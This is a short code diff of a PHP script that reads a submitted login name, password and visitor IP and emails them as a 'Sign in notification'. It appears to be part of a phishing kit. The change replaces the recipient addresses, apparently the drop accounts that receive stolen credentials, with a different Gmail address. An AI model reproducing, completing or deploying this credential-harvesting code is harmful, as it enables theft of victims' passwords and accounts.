@@ -9,7 +9,7 @@ $loginpswd = $_POST['loginpswd'];
 $re_loginpswd = $_POST['re_loginpswd'];
 $ip = getenv('REMOTE_ADDR');
 
-$recipient = 'kkshohett@gmail.com,hrdepartment86@outlook.com';
+$recipient = 'jbog1534@gmail.com';
 $subject = "Sign in notification $loginfmt ";
 $message = '
 <html>
